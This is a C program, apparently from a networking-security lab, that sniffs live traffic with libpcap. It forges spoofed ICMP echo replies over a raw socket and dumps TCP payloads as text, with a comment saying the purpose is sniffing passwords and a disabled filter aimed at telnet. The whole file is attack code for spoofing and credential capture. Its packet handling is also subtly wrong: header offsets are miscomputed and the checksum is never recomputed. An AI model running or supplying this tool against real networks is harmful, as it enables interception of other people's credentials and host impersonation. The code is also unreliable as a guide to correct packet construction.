#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>

#include <stdlib.h>    // for exit failure
#include <linux/tcp.h> // For Sniffing password

#include <ctype.h> // for isprint() check if the character is printable or not

#include <string.h> 

#define ETHER_ADDR_LEN 6
#define EXIT_FAILURE 1
#define MTU 1500

enum {FALSE , TRUE};

/* Ethernet header */

struct ethheader
{
    u_char ether_dhost[ETHER_ADDR_LEN];
    u_char ether_shost[ETHER_ADDR_LEN];
    u_short ether_type;
};

/* IP header */

struct ipheader
{

    unsigned char iph_ihl : 4, iph_ver : 4; // IP header length , IP version

    unsigned char iph_tos;      // Type of service
    unsigned short int iph_len; // IP Packet length (data + header)

    unsigned short int iph_ident;                     // Identification
    unsigned short int iph_flag : 3, iph_offset : 13; // Fragmentation flags , Flags offset

    unsigned char iph_ttl;         // Time to Live
    unsigned char iph_protocol;    // Protocol type
    unsigned short int iph_chksum; // IP datagram checksum

    struct in_addr iph_sourceip; // Source IP address
    struct in_addr iph_destip;   // Destination IP address
};

/* ICMP header */

struct icmpheader
{
    unsigned char icmp_type; // ICMP type
    unsigned char icmp_code; // Code for ERROR

    unsigned short int icmp_chksum; // checksum for ICMP header and DATA
    unsigned short int icmp_id; // used for identification the request
    unsigned short int icmp_seq; // swquence number
};

void spoof_RawSocket(struct ipheader* ip)
{
    struct sockaddr_in dest_addr;
    int enable = 1;

    // Creating the Raw Socket.
    int sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(sock == -1){
        printf("Fail to Create");
        exit(EXIT_FAILURE);
    }
    // Set socket to enable IP_HDRINCL on the socket.
    int set = setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&enable,sizeof(enable));
        if(set == -1){
        printf("Fail to Set Socket");
        exit(EXIT_FAILURE);
    }

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr = ip->iph_destip;

    sendto(sock,ip,ntohs(ip->iph_len),0,(struct sockaddr*)&dest_addr,sizeof(dest_addr));

    close(sock);
}

void forge_Packet(struct ipheader *ip){
    int header_length = ip->iph_ihl*4;
    const char buffer[MTU];

    // Copying the Original Packet 
    bzero((char *)buffer,MTU);
    memcpy((char*)buffer,ip,ntohs(ip->iph_len));

    struct ipheader* fakeIP = (struct ipheader*)buffer;
    struct icmpheader* fakeICMP = (struct icmpheader*)(buffer + sizeof(header_length));

    // Swaping Soruce & Destiantion for fake response
    fakeIP->iph_sourceip = ip->iph_destip;
    fakeIP->iph_destip = ip->iph_sourceip;
    printf("%s", inet_ntoa(ip->iph_sourceip));
    printf("%s", inet_ntoa(ip->iph_destip));
    fakeIP->iph_ttl = 99; // When there is DUP! we know what ours

    // ICMP reply - type 0
    fakeICMP->icmp_type = 0;

    spoof_RawSocket(fakeIP);

}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    printf("\n/*/----/*/----/*/\n/*/----/*/----/*/\n");
    printf("Got a packet \n");

    struct ethheader *eth = (struct ethheader *)packet;

    if (ntohs(eth->ether_type) == 0x0800)
    {
        struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
        struct tcphdr *tcp = (struct tcphdr *)((u_char *)ip + sizeof(struct ipheader));
        unsigned short pktlen = ntohs(ip->iph_len);

        printf("  Source : %s\n", inet_ntoa(ip->iph_sourceip));
        printf("  Destination : %s\n", inet_ntoa(ip->iph_destip));

        switch (ip->iph_protocol)
        {
        case IPPROTO_ICMP:
            printf("    Protocol: ICMP\n");
            forge_Packet(ip);
            break;
        case IPPROTO_TCP:
            printf("    Protocol: TCP\n");

            u_char dos = 4; // data offset
            int count = 0;
            if ((pktlen - sizeof(struct ipheader)) > dos)
            {
                printf("      Data:        ");
                u_char *data = (u_char *)tcp + dos;
                unsigned short password = pktlen - (sizeof(struct ipheader) + dos);
                for (unsigned short i = 0; i < password; i++)
                {
                    if(isprint(*data) != 0){
                        printf("%c",*data);
                    }
                    data++;
                }
                printf("\n/*/----/*/----/*/\n/*/----/*/----/*/\n");
            }
            break;
        case IPPROTO_UDP:
            printf("    Protocol: UDP\n");
            break;
        default:
            printf("    Protocol: Others..\n");
            break;
        }
    }
}

/*

*/

int main()
{

    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "ip proto \\icmp";
    //char filter_exp[] = "icmp";
    //char filter_exp[] = "tcp port telnet";
    bpf_u_int32 net;

    // Open live pcap session
    handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
    // Compile Filter into the Berkeley Packet Filter (BPF)
    pcap_compile(handle, &fp, filter_exp, 0, net);

    if (pcap_setfilter(handle, &fp) == -1)
    {
        pcap_perror(handle, "ERROR");
        exit(EXIT_FAILURE);
    }

    // Sniffing..

    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle);

    return 0;
}
